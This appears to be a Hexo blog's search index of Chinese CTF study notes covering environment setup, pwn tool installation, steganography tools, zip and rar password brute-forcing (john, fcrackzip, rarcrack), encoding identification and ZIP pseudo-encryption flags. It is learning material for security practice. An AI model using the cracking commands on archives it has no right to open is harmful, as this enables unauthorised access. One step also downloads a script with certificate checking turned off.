<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>更换源</title>
      <link href="/2023/03/19/Linux/Ubuntu%20%E5%92%8C%20Kali/%E6%9B%B4%E6%8D%A2%E6%BA%90/"/>
      <url>/2023/03/19/Linux/Ubuntu%20%E5%92%8C%20Kali/%E6%9B%B4%E6%8D%A2%E6%BA%90/</url>
      
        <content type="html"><![CDATA[<h2 id="更换-镜像源（ubuntu-22-04）"><a href="#更换-镜像源（ubuntu-22-04）" class="headerlink" title="更换 镜像源（ubuntu 22.04）"></a>更换 镜像源（ubuntu 22.04）</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /etc/apt<span class="token function">vim</span> sources.list-----------------------------------------------------------------<span class="token comment"># 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy main restricted universe multiverse<span class="token comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy main restricted universe multiverse</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-updates main restricted universe multiverse<span class="token comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-updates main restricted universe multiverse</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse<span class="token comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse</span>deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-security main restricted universe multiverse<span class="token comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-security main restricted universe multiverse</span><span class="token comment"># 预发布软件源，不建议启用</span><span class="token comment"># deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-proposed main restricted universe multiverse</span><span class="token comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ jammy-proposed main restricted universe multiverse</span>-----------------------------------------------------------------<span class="token function">sudo</span> <span class="token function">apt-get</span> update<span class="token function">sudo</span> <span class="token function">apt-get</span> upgrade<span class="token function">sudo</span> <span class="token function">apt-get</span> clean<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="更换-镜像源（kali-2022-4）"><a href="#更换-镜像源（kali-2022-4）" class="headerlink" title="更换 镜像源（kali 2022.4）"></a>更换 镜像源（kali 2022.4）</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /etc/apt<span class="token function">vim</span> sources.list-----------------------------------------------------------------deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free-----------------------------------------------------------------<span class="token function">sudo</span> <span class="token function">apt-get</span> update<span class="token function">sudo</span> <span class="token function">apt-get</span> upgrade<span class="token function">sudo</span> <span class="token function">apt-get</span> clean<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="更换-pip-源"><a href="#更换-pip-源" class="headerlink" title="更换 pip 源"></a>更换 pip 源</h2><ul><li>命令行直接更改</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip config <span class="token builtin class-name">set</span> global.index-url https://pypi.tuna.tsinghua.edu.cn/simple<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python配置</title>
      <link href="/2023/03/19/Linux/Ubuntu%20%E5%92%8C%20Kali/Python%E9%85%8D%E7%BD%AE/"/>
      <url>/2023/03/19/Linux/Ubuntu%20%E5%92%8C%20Kali/Python%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="安装-pip"><a href="#安装-pip" class="headerlink" title="安装 pip"></a>安装 pip</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://bootstrap.pypa.io/get-pip.py  --no-check-certificatepython get-pip.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h2 id="修改默认-python-版本"><a href="#修改默认-python-版本" class="headerlink" title="修改默认 python 版本"></a>修改默认 python 版本</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">rm</span> /usr/bin/python<span class="token function">sudo</span> <span class="token function">ln</span> <span class="token parameter variable">-s</span> /usr/bin/python3.10 /usr/bin/python<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF配置</title>
      <link href="/2023/03/19/Linux/Ubuntu%20%E5%92%8C%20Kali/CTF%E9%85%8D%E7%BD%AE/"/>
      <url>/2023/03/19/Linux/Ubuntu%20%E5%92%8C%20Kali/CTF%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="安装-32位-库"><a href="#安装-32位-库" class="headerlink" title="安装 32位 库"></a>安装 32位 库</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libc6-dev-i386<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> lib32z1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h2 id="安装-Capstone"><a href="#安装-Capstone" class="headerlink" title="安装 Capstone"></a>安装 Capstone</h2><blockquote><p>一个轻量级的多平台架构支持的反汇编架构</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/aquynh/capstone<span class="token builtin class-name">cd</span> capstone<span class="token function">make</span><span class="token function">sudo</span> <span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="安装-pwntools"><a href="#安装-pwntools" class="headerlink" title="安装 pwntools"></a>安装 pwntools</h2><ul><li>通过 python 的 pip 安装</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> python3-pippip3 <span class="token function">install</span> <span class="token parameter variable">--upgrade</span> pip<span class="token function">sudo</span> python3 <span class="token parameter variable">-m</span> pip <span class="token function">install</span> pwntools<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>通过 git 安装</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/Gallopsled/pwntools<span class="token builtin class-name">cd</span> pwntools<span class="token function">sudo</span> python setup.py <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>验证安装</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python-------------------------------------------<span class="token function">import</span> pwnpwn.asm<span class="token punctuation">(</span><span class="token string">"xor eax,eax"</span><span class="token punctuation">)</span>-------------------------------------------from pwn <span class="token function">import</span> *asm<span class="token punctuation">(</span><span class="token string">"xor eax,eax"</span><span class="token punctuation">)</span>-------------------------------------------输出：<span class="token string">'1\xc0'</span>-------------------------------------------<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="安装-LibcSearcher"><a href="#安装-LibcSearcher" class="headerlink" title="安装 LibcSearcher"></a>安装 LibcSearcher</h2><blockquote><p>在做栈溢出相关的题时，经常会遇到构造 ROP 链的情况。若我们在 IDA 反编译之后没有看到 system 函数，栈题大概率需要泄漏 libc 库中的函数。此时，LibcSearcher 就是最好的选择，可以用它找到偏移地址</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/lieanu/LibcSearcher.git<span class="token builtin class-name">cd</span> LibcSearcher<span class="token function">sudo</span> python setup.py develop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h2 id="安装-ROPgadget"><a href="#安装-ROPgadget" class="headerlink" title="安装 ROPgadget"></a>安装 ROPgadget</h2><blockquote><p>用来找 gadget 的，这个安装 pwntools 时自带，如果没有的话可以再手动安装</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/JonathanSalwan/ROPgadget.git<span class="token builtin class-name">cd</span> ROPgadget<span class="token function">sudo</span> python setup.py <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h2 id="安装-one-gadget"><a href="#安装-one-gadget" class="headerlink" title="安装 one_gadget"></a>安装 one_gadget</h2><blockquote><p>one_gadget 可以用来动态查找执行 libc 动态库中的 system 执行函数，可以一步到位。在做相关堆题时尤为有效<br>用来寻找 libc 库中的 <code>execve(&#39;/bin/sh&#39;, NULL, NULL)</code> 可以一个 gadget 就可以 getshell，需要注意 one_gadget 相关限制条件</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> ruby<span class="token function">sudo</span> gem <span class="token function">install</span> one_gadget<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h2 id="安装-glibc-all-in-one"><a href="#安装-glibc-all-in-one" class="headerlink" title="安装 glibc-all-in-one"></a>安装 glibc-all-in-one</h2><blockquote><p>在做堆题时，经常遇到不同版本的 libc，这时 glibc-all-in-one 可以很好的派上用场，动态更改 elf 文件 libc 版本</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/matrix1001/glibc-all-in-one.git<span class="token builtin class-name">cd</span> glibc-all-in-one./update_list<span class="token function">cat</span> list./download <span class="token operator">&lt;</span>需要的 libc 版本<span class="token operator">></span>（例如：2.31-0ubuntu9_amd64）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="安装-qemu"><a href="#安装-qemu" class="headerlink" title="安装 qemu"></a>安装 qemu</h2><blockquote><p>这是 arm 的 pwn 环境，前期可以不安装，但是终究是逃不过的，建议一步到位</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> qemu<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> qemu-system qemu-user-static binfmt-support<span class="token comment"># 安装依赖库</span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> <span class="token parameter variable">-y</span> gcc-arm-linux-gnueabi<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> qemu libncurses5-dev gcc-arm-linux-gnueabi build-essential gdb-arm-none-eabi synaptic gcc-aarch64-linux-gnu eclipse-cdt <span class="token function">git</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="安装-zsteg"><a href="#安装-zsteg" class="headerlink" title="安装 zsteg"></a>安装 zsteg</h2><blockquote><p>图像隐写神器</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> gem <span class="token function">install</span> zsteg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="安装-basecrack"><a href="#安装-basecrack" class="headerlink" title="安装 basecrack"></a>安装 basecrack</h2><blockquote><p>Base 编码分析工具</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/mufeedvh/basecrack.git<span class="token builtin class-name">cd</span> basecrackpip <span class="token function">install</span> <span class="token parameter variable">-r</span> requirements.txtpython basecrack.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>音频隐写</title>
      <link href="/2023/03/19/CTF%20-%20Misc/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/"/>
      <url>/2023/03/19/CTF%20-%20Misc/%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99/</url>
      
        <content type="html"><![CDATA[<h2 id="wav-隐写"><a href="#wav-隐写" class="headerlink" title="wav 隐写"></a>wav 隐写</h2><blockquote><p>音频分析软件 Audacity 下载地址：<a href="https://www.audacityteam.org/">Audacity ® | Free</a></p><p>音频隐写软件 DeepSound 下载地址：<a href="http://www.jpinsoft.net/deepsound/download.aspx">DeepSound -&gt; Download</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MISC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>压缩包密码爆破</title>
      <link href="/2023/03/19/CTF%20-%20Misc/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/"/>
      <url>/2023/03/19/CTF%20-%20Misc/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/</url>
      
        <content type="html"><![CDATA[<h2 id="John-the-Ripper"><a href="#John-the-Ripper" class="headerlink" title="John the Ripper"></a>John the Ripper</h2><ul><li>下载安装：</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> john<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>用法：<br><code>John -wordlist=&lt;字典路径&gt;</code> 【<code>-wordlist</code> —— 指定字典爆破】</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">zip2john <span class="token operator">&lt;</span>文件名<span class="token operator">></span> <span class="token operator">>></span>password.txt <span class="token comment"># 把密码信息提取出来</span>john password <span class="token parameter variable">--show</span> <span class="token comment"># 查看密码</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h2 id="fcrackzip"><a href="#fcrackzip" class="headerlink" title="fcrackzip"></a>fcrackzip</h2><ul><li>下载安装：</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> fcrackzip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>用法：<br><code>fcrackzip -b -c &#39;aA1!&#39; -l 1-10 -u &lt;zip文件名&gt;</code></li></ul><table><thead><tr><th align="left">参数</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">-b</td><td align="left">代表 暴力破解</td></tr><tr><td align="left">-c</td><td align="left">指定使用的字符集</td></tr><tr><td align="left">-l</td><td align="left">限制密码长度</td></tr></tbody></table><hr><h2 id="rarcrack"><a href="#rarcrack" class="headerlink" title="rarcrack"></a>rarcrack</h2><ul><li>下载安装：</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> rarcrack<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> libxml2-dev<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>用法：<br><code>rarcrack &lt;文件名&gt; --threads &lt;线程数&gt; --type &lt;rar/zip/7z&gt;</code></li></ul>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MISC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图像隐写</title>
      <link href="/2023/03/19/CTF%20-%20Misc/%E5%9B%BE%E5%83%8F%E9%9A%90%E5%86%99/"/>
      <url>/2023/03/19/CTF%20-%20Misc/%E5%9B%BE%E5%83%8F%E9%9A%90%E5%86%99/</url>
      
        <content type="html"><![CDATA[<h2 id="分析文件里面包含的隐藏文件-——-binwalk"><a href="#分析文件里面包含的隐藏文件-——-binwalk" class="headerlink" title="分析文件里面包含的隐藏文件 —— binwalk"></a>分析文件里面包含的隐藏文件 —— binwalk</h2><ul><li><code>binwalk &lt;文件名&gt;</code><br>可直接扫描，通过扫描能够发现目标文件中包含的所有可识别的文件类型  </li><li><code>binwalk -e &lt;文件名&gt;</code><br>扫描，extract 自动提取已知的文件类型</li></ul><hr><h2 id="检测-png-和-bmp-图片里的隐写数据-——-zsteg"><a href="#检测-png-和-bmp-图片里的隐写数据-——-zsteg" class="headerlink" title="检测 png 和 bmp 图片里的隐写数据 —— zsteg"></a>检测 png 和 bmp 图片里的隐写数据 —— zsteg</h2><ul><li>安装：<code>sudo gem install zsteg</code></li><li><code>zsteg &lt;文件名&gt;</code><br>查看 LSB 分析结果</li><li><code>zsteg &lt;文件名&gt; --all</code><br>快速提取所有隐藏信息</li><li><code>zsteg -e &quot;偏移地址&quot; &lt;源文件名&gt; &gt; &lt;提取文件的文件名&gt;</code><br>提取文件</li></ul><hr><h2 id="文件分离-——-foremost"><a href="#文件分离-——-foremost" class="headerlink" title="文件分离 —— foremost"></a>文件分离 —— foremost</h2><ul><li><code>foremost &lt;文件名&gt;</code><ol><li>会形成一个 output 文件夹，里面存放的是分离出来的文件</li><li>如果已经知道文件中包含了一个其他的文件类型，通过 <code>binwalk</code> 得到偏移地址，可以直接在 winhex 中定位到该偏移地址，然后将文件的内容直接复制到一个新建的文件中，即可得到包含的文件</li></ol></li></ul><hr><h2 id="打印文件中可打印字符串"><a href="#打印文件中可打印字符串" class="headerlink" title="打印文件中可打印字符串"></a>打印文件中可打印字符串</h2><ul><li><code>strings &lt;文件名&gt;</code></li><li><code>strings &lt;文件名&gt; | grep flag</code></li></ul><hr><h2 id="轻量级的图片隐写工具-——-Stegsolve"><a href="#轻量级的图片隐写工具-——-Stegsolve" class="headerlink" title="轻量级的图片隐写工具 —— Stegsolve"></a>轻量级的图片隐写工具 —— Stegsolve</h2><ul><li>下载地址：<a href="http://www.caesum.com/handbook/Stegsolve.jar">Stegsolve.jar（win&#x2F;linux）</a></li><li>安装 java jdk 环境，用 <code>java -version</code> 验证</li><li>win 下通过 cmd 打开：<br><code>javaw -jar &lt;Stegsolve.jar 所在路径&gt;</code></li><li>linux 下打开：<br><code>java -jar &lt;Stegsolve.jar 所在路径&gt;</code></li></ul>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MISC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>各种加密方法的特点</title>
      <link href="/2023/03/19/CTF%20-%20Misc/%E5%90%84%E7%A7%8D%E5%8A%A0%E5%AF%86%E6%96%B9%E6%B3%95%E7%9A%84%E7%89%B9%E7%82%B9/"/>
      <url>/2023/03/19/CTF%20-%20Misc/%E5%90%84%E7%A7%8D%E5%8A%A0%E5%AF%86%E6%96%B9%E6%B3%95%E7%9A%84%E7%89%B9%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<h2 id="Base-家族"><a href="#Base-家族" class="headerlink" title="Base 家族"></a>Base 家族</h2><blockquote><p>BaseCrack 下载地址：<a href="https://github.com/mufeedvh/basecrack">basecrack</a><br>安装依赖文件：<code>pip3 install -r requirements.txt</code><br>运行：<code>python basecrack.py</code></p><p>在 BaseCrack 的帮助下，可以一次性对任意模式下的多重 Base 编码数据进行解码</p></blockquote><h3 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h3><ul><li><p>经过 Base64 编码后的字符串长度一定会被4整除（包括后缀等号）</p></li><li><p>等号不超过两个</p></li></ul><hr><h3 id="Base91"><a href="#Base91" class="headerlink" title="Base91"></a>Base91</h3><ul><li>从 ASCii 字符（0x21 - 0x7E）中除 <code>&#39;-&#39;</code>（0x2D）、<code>&#39;\&#39;</code>（0x5C）、<code>&#39;&#39;&#39;</code>（0x27）外的其他 91 个可打印字符组成</li></ul><hr><h2 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h2><ul><li>MD5 值是 32位 由数字 0-9，字母 a-f 组成的字符串（也有可能是16位）</li></ul><hr><h2 id="URL-编码"><a href="#URL-编码" class="headerlink" title="URL 编码"></a>URL 编码</h2><ul><li>有 <code>&#39;%&#39;</code></li></ul><hr><h2 id="Brainfuck"><a href="#Brainfuck" class="headerlink" title="Brainfuck"></a>Brainfuck</h2><ul><li>用 <code>&#39;&gt;&#39;</code>、<code>&#39;&lt;&#39;</code>、<code>&#39;+&#39;</code>、<code>&#39;-&#39;</code>、<code>&#39;.&#39;</code>、<code>&#39;,&#39;</code>、<code>&#39;[&#39;</code>、<code>&#39;]&#39;</code> 八种符号组成</li><li>例如：<br>明文 Hello World!，加密后密文为：++++++++++[&gt;+++++++&gt;++++++++++&gt;+++&gt;+&lt;&lt;&lt;&lt;-]&gt;++.&gt;+.+++++++..+++.&gt;++.&lt;&lt;+++++++++++++++.&gt;.+++.——.——–.&gt;+.&gt;.</li></ul><hr><h2 id="Ook"><a href="#Ook" class="headerlink" title="Ook!"></a>Ook!</h2><ul><li>存在很多 <code>&#39;.&#39;</code>、<code>&#39;!&#39;</code>、<code>&#39;?&#39;</code> 符号</li></ul><hr><h2 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h2><hr><h2 id="Rabbit"><a href="#Rabbit" class="headerlink" title="Rabbit"></a>Rabbit</h2><ul><li><p>Rabbit 加密开头部分通常为：<code>U2FsdGVkX1</code></p></li><li><p>明显密文里​​ <code>&#39;+&#39;</code> 比较多，并且经常有 <code>&#39;/&#39;</code></p></li><li><p>例如：<br>明文 I Love You 521，无密钥，加密后密文为：<strong>U2FsdGVkX1</strong>9DvuEo5PvBA8TuLrM2t+EZBvUkzlAa<br>明文 I Love You 521，密钥为 666，加密后密文为：<strong>U2FsdGVkX1</strong>8w6vxXxux&#x2F;ivRVwo3xMzTxmUyk7cHz</p></li></ul><hr>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MISC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ZIP伪加密</title>
      <link href="/2023/03/19/CTF%20-%20Misc/ZIP%E4%BC%AA%E5%8A%A0%E5%AF%86/"/>
      <url>/2023/03/19/CTF%20-%20Misc/ZIP%E4%BC%AA%E5%8A%A0%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<h2 id="ZIP-伪加密原理"><a href="#ZIP-伪加密原理" class="headerlink" title="ZIP 伪加密原理"></a>ZIP 伪加密原理</h2><blockquote><p>zip伪加密是在文件头的加密标志位做修改，进而再打开文件时识被别为加密压缩包</p></blockquote><hr><h2 id="ZIP-伪加密自动化识别与修复工具"><a href="#ZIP-伪加密自动化识别与修复工具" class="headerlink" title="ZIP 伪加密自动化识别与修复工具"></a>ZIP 伪加密自动化识别与修复工具</h2><h3 id="ZipCenOp-jar"><a href="#ZipCenOp-jar" class="headerlink" title="ZipCenOp.jar"></a>ZipCenOp.jar</h3><ul><li>下载安装：<a href="https://github.com/442048209as/ZipCenOp/releases/tag/1.0">Release 1.0 · 442048209as&#x2F;ZipCenOp</a></li><li>使用：<code>java -jar ZipCenOp.jar r &lt;zip 文件名&gt;</code></li></ul><h3 id="WinRAR"><a href="#WinRAR" class="headerlink" title="WinRAR"></a>WinRAR</h3><ul><li>进入 “工具”，修复压缩文件</li></ul><hr><h2 id="ZIP-文件的结构"><a href="#ZIP-文件的结构" class="headerlink" title="ZIP 文件的结构"></a>ZIP 文件的结构</h2><blockquote><p>一个 ZIP 文件由三个部分组成</p></blockquote><ul><li><h3 id="压缩源文件-——-数据区"><a href="#压缩源文件-——-数据区" class="headerlink" title="压缩源文件 —— 数据区"></a>压缩源文件 —— 数据区</h3><p><mark>50 4B 03 04：这是头文件标记（0x04034b50）</mark><br>14 00：解压文件所需 pkware 版本<br><mark>09 00：全局方式位标记（有无加密）</mark><br>08 00：压缩方式<br>50 A3：最后修改文件时间<br>A5 4A：最后修改文件日期<br>21 38 76 64：CRC-32校验（1480B516）<br>19 00 00 00：压缩后尺寸（25）<br>17 00 00 00：未压缩尺寸（23）<br>08 00：文件名长度<br>00 00：扩展记录长度</p></li><li><h3 id="压缩源文件-——-目录区"><a href="#压缩源文件-——-目录区" class="headerlink" title="压缩源文件 —— 目录区"></a>压缩源文件 —— 目录区</h3><p><mark>50 4B 01 02：目录中文件文件头标记(0x02014b50)</mark><br>1F 00：压缩使用的 pkware 版本<br>14 00：解压文件所需 pkware 版本<br><mark>09 00：全局方式位标记（有无加密，<em><strong>更改这里进行伪加密</strong></em>，改为09 00打开就会提示有密码了）</mark><br>08 00：压缩方式<br>50 A3：最后修改文件时间<br>A5 4A：最后修改文件日期<br>21 38 76 65：CRC-32校验（1480B516）<br>19 00 00 00：压缩后尺寸（25）<br>17 00 00 00：未压缩尺寸（23）<br>08 00：文件名长度<br>24 00：扩展字段长度<br>00 00：文件注释长度<br>00 00：磁盘开始号<br>00 00：内部文件属性<br>20 00 00 00：外部文件属性<br>00 00 00 00：局部头部偏移量</p></li><li><h3 id="压缩源文件-——-目录结束标志"><a href="#压缩源文件-——-目录结束标志" class="headerlink" title="压缩源文件 —— 目录结束标志"></a>压缩源文件 —— 目录结束标志</h3><p><mark>50 4B 05 06：目录结束标记</mark><br>00 00：当前磁盘编号<br>00 00：目录区开始磁盘编号<br>01 00：本磁盘上纪录总数<br>01 00：目录区中纪录总数<br>5A 00 00 00：目录区尺寸大小<br>3F 00 00 00：目录区对第一张磁盘的偏移量<br>00 00 00：ZIP 文件注释长度</p></li></ul><hr><h2 id="无加密"><a href="#无加密" class="headerlink" title="无加密"></a>无加密</h2><table><thead><tr><th>区域</th><th>参数</th></tr></thead><tbody><tr><td>数据区的全局加密</td><td>00 00</td></tr><tr><td>目录区的全局方式位标记</td><td>00 00</td></tr></tbody></table><hr><h2 id="伪加密"><a href="#伪加密" class="headerlink" title="伪加密"></a>伪加密</h2><table><thead><tr><th>区域</th><th>参数</th></tr></thead><tbody><tr><td>数据区的全局加密</td><td>00 00</td></tr><tr><td>目录区的全局方式位标记</td><td>09 00</td></tr></tbody></table><hr><h2 id="真加密"><a href="#真加密" class="headerlink" title="真加密"></a>真加密</h2><table><thead><tr><th>区域</th><th>参数</th></tr></thead><tbody><tr><td>数据区的全局加密</td><td>09 00</td></tr><tr><td>目录区的全局方式位标记</td><td>09 00</td></tr></tbody></table><hr><h2 id="加密与解密"><a href="#加密与解密" class="headerlink" title="加密与解密"></a>加密与解密</h2><table><thead><tr><th>加解密</th><th>方法</th></tr></thead><tbody><tr><td>去除密码</td><td><mark><strong>压缩源文件目录区 的 全局方式位标记 的 01 00 或 09 00 改为 00 00</strong></mark></td></tr><tr><td>添加密码提示</td><td>压缩源文件目录区 的 全局方式位标记 的 00 00 改为 01 00 或 09 00</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MISC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GIF图片拆分&amp;拼图</title>
      <link href="/2023/03/19/CTF%20-%20Misc/GIF%E5%9B%BE%E7%89%87%E6%8B%86%E5%88%86-%E6%8B%BC%E5%9B%BE/"/>
      <url>/2023/03/19/CTF%20-%20Misc/GIF%E5%9B%BE%E7%89%87%E6%8B%86%E5%88%86-%E6%8B%BC%E5%9B%BE/</url>
      
        <content type="html"><![CDATA[<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><hr><h3 id="拆分并直接展示"><a href="#拆分并直接展示" class="headerlink" title="拆分并直接展示"></a>拆分并直接展示</h3><ul><li>在线网站：<a href="https://tu.sioe.cn/gj/fenjie/">GIF动态图片分解，多帧动态图分解成多张静态图片</a></li></ul><h3 id="拆分"><a href="#拆分" class="headerlink" title="拆分"></a>拆分</h3><ul><li>在线网站：<a href="https://uutool.cn/gif2img/">在线GIF图片帧拆分工具 - UU在线工具</a></li></ul><h3 id="ImageMagick"><a href="#ImageMagick" class="headerlink" title="ImageMagick"></a>ImageMagick</h3><ul><li>下载：<a href="https://imagemagick.org/script/download.php#windows">图像魔术 – 下载</a></li><li>使用：<ol><li>到需要拼接的图片目录下，调用 <code>cmd</code></li><li>使用命令：<code>magick montage *.png -tile &lt;10x10&gt; -geometry +0+0 flag.png</code> 【10x10表示拼成横竖10张的图】</li></ol></li></ul><hr><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><hr><h3 id="convert"><a href="#convert" class="headerlink" title="convert"></a>convert</h3><ul><li>使用：<code>convert &lt;.gif文件名&gt; &lt;输出路径/flag.png&gt;</code></li></ul><h3 id="montage"><a href="#montage" class="headerlink" title="montage"></a>montage</h3><ul><li>下载安装：</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> graphicsmagick-imagemagick-compat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>使用：<code>montage *.png -tile &lt;10x10&gt; -geometry +0+0 flag.png</code> 